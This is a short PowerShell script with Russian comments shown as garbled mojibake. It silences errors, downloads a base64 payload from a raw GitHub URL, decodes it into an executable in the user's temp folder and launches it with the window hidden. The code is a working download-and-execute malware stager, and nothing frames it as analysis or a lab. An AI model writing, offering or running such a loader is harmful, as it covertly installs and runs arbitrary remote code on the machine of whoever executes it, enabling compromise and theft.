$ErrorActionPreference = "SilentlyContinue"
$payloadUrl = "https://raw.githubusercontent.com/jimboslimuser/p/main/payload.b64"
$outPath    = "$env:TEMP\p.exe"

# Ð£Ð´Ð°Ð»ÑÐµÐ¼ ÑÑ‚Ð°Ñ€Ñ‹Ð¹ Ñ„Ð°Ð¹Ð», ÐµÑÐ»Ð¸ ÐµÑÑ‚ÑŒ
if (Test-Path $outPath) {
    Remove-Item $outPath -Force
}

try {
    # Ð¡ÐºÐ°Ñ‡Ð¸Ð²Ð°ÐµÐ¼ payload.b64 Ð¸ Ð´ÐµÐºÐ¾Ð´Ð¸Ñ€ÑƒÐµÐ¼ Ð² .exe
    $wc = New-Object Net.WebClient
    $b  = [Convert]::FromBase64String($wc.DownloadString($payloadUrl))
    [IO.File]::WriteAllBytes($outPath, $b)
} catch {
    exit 1
}

# Ð—Ð°Ð¿ÑƒÑÐºÐ°ÐµÐ¼ .exe Ð‘Ð•Ð— Ð¾Ñ‚Ð¾Ð±Ñ€Ð°Ð¶ÐµÐ½Ð¸Ñ Ð¾ÐºÐ½Ð° (Ñ‚Ð¸Ñ…Ð¸Ð¹ Ñ€ÐµÐ¶Ð¸Ð¼)
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run("cmd /c start """" `"$outPath`"", 0, $false)